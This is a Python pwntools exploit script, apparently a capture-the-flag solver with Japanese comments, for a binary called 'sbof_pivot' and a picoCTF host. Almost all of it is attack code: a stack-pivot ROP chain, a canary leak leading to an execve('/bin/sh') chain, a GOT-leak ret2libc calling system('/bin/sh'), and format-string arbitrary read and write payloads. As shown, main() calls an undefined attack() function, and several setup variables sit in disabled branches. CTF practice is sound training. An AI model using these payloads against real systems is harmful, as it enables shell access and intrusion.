#!/usr/bin/env python3
from pwn import *

bin_file = './sbof_pivot'
context(os = 'linux', arch = 'amd64')

binf = ELF( bin_file )

if False: # for attack_stack_pivot()
    info( f"binf.bss()=0x{binf.bss():X}, binf.symbols['msg']=0x{binf.symbols['msg']:X}" )
    info( f"binf.functions['win'].address=0x{binf.functions['win'].address:X}" )

elif False: # for attack_stack()
    offset_main = binf.functions['main'].address

elif False: # for attack_resolve
    addr_main          = binf.functions['main'].address
    addr_got_setbuf    = binf.got['setbuf']
    addr_got_scf       = binf.got['__stack_chk_fail']
    addr_bss            = binf.bss()
    
    libc = binf.libc
    offset_libc_setbuf = libc.functions['setbuf'].address

def attack_stack_pivot( proc, **kwargs ):
    
    rop = ROP( binf )
    
    ropchain = b''
    ropchain += b'A' * 8                  # name
    ropchain += b'B' * 8                  # name
    ropchain += p64( binf.symbols['msg'] + 0xc0 - 8 ) # Saved RBP (0xc0 は win関数で使うスタック量を考慮)
    ropchain += p64( rop.leave.address )  # leave; ret;
    
    #info( proc.sendlineafter(b'>> ', ropchain[:-1]).decode() ) # なぜか、sendlineafter() ではうまくいかない
    info( proc.sendafter(b'>> ', ropchain[:-1]).decode() ) # fgets() は自動で、NULL終端するため、1byte手前まで送信する
    
    ropchain = b''
    ropchain += b'A' * 0xc0
    ropchain += p64( rop.rdi.address )    # pop rdi; ret;
    ropchain += p64( 0xcafebabe )         # key1
    ropchain += p64( rop.rsi.address )    # pop rsi; pop r15; ret;
    ropchain += p64( 0xc0bebeef )         # key2
    ropchain += p64( 0xdeadbeef )         # for r15 (何でもいい)
    ropchain += p64( binf.functions['win'].address ) # win()
    
    #info( proc.sendafter(b'>> ', ropchain).decode() ) # こちらは sendafter() ではうまくいかない
    info( proc.sendlineafter(b'>> ', ropchain).decode() )
    info( proc.recvall().decode() )

def attack_stack( conn, **kwargs ):
    
    conn.sendafter('>> ', b'a'*0x18+b'!')
    conn.recvuntil('a!')
    canary = unpack(b'\x00' + conn.recv(7))
    info('canary        = 0x{:08x}'.format(canary))
    
    conn.sendafter('>> ', b'b'*0x3f+b'!')
    conn.recvuntil('b!')
    addr_stack = unpack(conn.recv(6), 'all') - 0x158
    info('addr_stack    = 0x{:08x}'.format(addr_stack))
    
    conn.sendafter('>> ', b'c'*0x47+b'!')
    conn.recvuntil('c!')
    addr_main    = unpack(conn.recv(6), 'all')
    binf.address = addr_main - offset_main
    info('addr_bin_base = 0x{:08x}'.format(binf.address))
    
    rop = ROP(binf)
    
    exploit  = b'/bin/sh'.ljust(0x18, b'\x00')
    exploit += pack(canary)
    exploit += pack(0xdeadbeef)
    exploit += flat(rop.rdi.address, addr_stack)
    exploit += flat(rop.rsi.address, 0)
    exploit += flat(rop.rdx.address, 0)
    exploit += flat(rop.rax.address, constants.SYS_execve)
    exploit += pack(rop.syscall.address)
    conn.sendafter('>> ', exploit)

def attack_resolve( conn, **kwargs ):
    
    rop = ROP(binf)
    rop.raw(rop.ret)
    rop.printf(addr_got_setbuf)
    rop.raw(rop.ret)
    rop.main()
    
    conn.sendlineafter('>> ', pack(0xdeadbeef) + bytes(rop))
    conn.sendlineafter('>> ', str(hex(addr_got_scf)))
    conn.sendafter('>> ', str(hex(rop.r12_r13_r14_r15.address)))
    conn.send(pack(0xcafebabe))
    
    addr_libc_setbuf    = unpack(conn.recv(6), 'all')
    libc.address = addr_libc_setbuf - offset_libc_setbuf
    info('addr_libc_base = 0x{:08x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))
    
    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.system(addr_libc_str_sh)
    
    conn.sendlineafter('>> ', bytes(rop))
    conn.sendlineafter('>> ', str(hex(addr_bss)))
    conn.sendlineafter('>> ', '0')

def attack_fsb_aarw( proc, **kwargs ):
    
    if False:
        # AAAAAAAA が出現する位置を確認する
        proc.sendline( b'AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p' )
        info( proc.recv().decode() )
        
        exit()
    
    elif False:
        # 位置が正しいことを確認するため、アドレスを出力する
        proc.sendline( b'%9$p'.ljust(8, b' ') + p64(0x404020) )
        info( proc.recv().decode() )
        
        exit()
    
    else:
        # GOT (0x404020) の値を出力する
        proc.sendline( b'%9$s'.ljust(8, b' ') + p64(0x404020) )
        if False:
            ret = proc.recvregex( b'([0-9a-f]+)', capture=True )
            info( f"0x{int(ret.group(0).decode(), 16)}" )
            info( f"0x{int(ret.group(1).decode(), 16)}" )
            #info( f"0x{u64(ret.group(0))}" )
        elif False:
            info( f"0x{int(proc.recv().strip(), 16)}" )
        elif True:
            tmp = u64( proc.recv(6) + b'\x00\x00' )
            info( hex(tmp) )
        
        #info( proc.recv().decode() ) # エラーが出るため、decode() を削除

def attack_fsb_random( proc, **kwargs ):
    
    proc.sendline( b'%*7$c%10$n'.ljust(0x10, b' ') + p64(binf.symbols['key']) )
    info( proc.recvall() ) # エラーが出るため、decode() を削除

def main():
    
    adrs = "shape-facility.picoctf.net"
    port = 51556
    #adrs = "localhost"
    #port = 4000
    
    #proc = gdb.debug( bin_file )
    proc = process( bin_file )
    #proc = remote( adrs, port )
    
    attack( proc )
    #proc.interactive()

if __name__ == '__main__':
    main()
